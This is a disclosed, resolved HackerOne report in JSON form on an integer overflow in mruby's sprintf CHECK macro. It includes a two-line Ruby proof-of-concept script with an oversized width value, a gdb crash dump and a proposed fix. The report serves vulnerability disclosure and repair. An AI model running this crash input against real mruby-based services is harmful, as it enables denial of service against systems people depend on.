{
  "id": 204628,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDQ2Mjg=",
  "url": "https://hackerone.com/reports/204628",
  "title": "segafult in mruby's sprintf - mrb_str_format",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-02-08T15:18:56.665Z",
  "submitted_at": "2017-02-08T15:18:56.665Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "aerodudrizzt",
    "url": "/aerodudrizzt",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-02-28T20:24:47.917Z",
  "bug_reporter_agreed_on_going_public_at": "2017-02-28T20:24:47.883Z",
  "team_member_agreed_on_going_public_at": "2017-02-27T23:30:51.205Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The mruby sprintf gem (out of scope of mruby-engine) can be crashed when using a hostile \"width\" value in the format string.\n\nExploit Script\n===========\n```ruby\ns = \"hello\"\nsprintf(\"abcdefghijklmnopqrstuvwxyz % 2147483640s\", s)\n```\n\nHere is the core dump:\n```\nCore was generated by `ext/mruby_engine/mruby/build/host/bin/mirb'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0xb768bd7a in ?? ()\n(gdb) bt\n#0  0xb768bd7a in ?? ()\n#1  0x00000006 in ?? ()\n#2  0x0813d000 in ?? ()\nBacktrace stopped: previous frame inner to this frame (corrupt stack?)\n(gdb) info reg\neax            0x20202020\t538976288\necx            0x1fff62c7\t536830663\nedx            0x1\t1\nebx            0x800\t2048\nesp            0xbfe037c4\t0xbfe037c4\nebp            0x78\t0x78\nesi            0x81d7dc8\t136150472\nedi            0x8216000\t136404992\neip            0xb768bd7a\t0xb768bd7a\neflags         0x10202\t[ IF RF ]\ncs             0x73\t115\nss             0x7b\t123\nds             0x7b\t123\nes             0x7b\t123\nfs             0x0\t0\ngs             0x33\t51\n```\n\nTech Details\n==========\nThe sprintf.c file in the mrb_str_format() function is responsible for the building of the formatted string. When using a \"width\" value for anything (string, char, number, etc...) there is an integer-overflow in the CHECK() macro that is responsible for assuring the string's capacity will be enough for the operation:\n```cpp\n#define CHECK(l) do { \\\n  while (blen + (l) >= bsiz) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n  buf += RSTRING_PTR(result);\\\n} while(0)\n``` \n\nProposed Fix\n===========\nSince ```bsiz``` is always bigger-or-equal to ```blen``` the right check should be:\n```cpp\n#define CHECK(l) do { \\\n  while ((l) >= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n  buf += RSTRING_PTR(result);\\\n} while(0)\n``` \nThis way no arithmetic operation will done over the \"width\" parameter which can be up to MAX_INT in size, causing many possible integer-overflow.",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-03-29T23:30:51.241Z",
  "allow_singular_disclosure_after": -216997433.3451293,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "heeeeen",
    "eveeez",
    "spetr0x"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
